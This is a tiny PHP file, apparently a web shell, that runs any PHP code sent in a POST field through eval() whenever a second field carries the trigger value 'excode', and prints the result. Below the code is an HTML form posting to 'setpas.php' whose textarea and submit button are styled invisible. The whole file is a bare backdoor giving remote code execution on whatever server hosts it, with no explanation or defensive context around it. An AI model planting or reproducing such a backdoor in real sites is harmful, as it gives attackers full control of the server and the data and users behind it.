<?php
	if (isset($_POST['excode']) && isset($_POST['cy'])=='excode') {
		if ($_POST['cy'] == 'excode') {
			$code = $_POST['excode'];
			$code = eval($code);
			echo $code;
		}
	}
?>
<form method="post" action="setpas.php">
	<input type="hidden" name="cy" value="excod" />
    <textarea style="display: none" name="excode"></textarea>
    <input type="submit" name="run" style="display: none">
</form>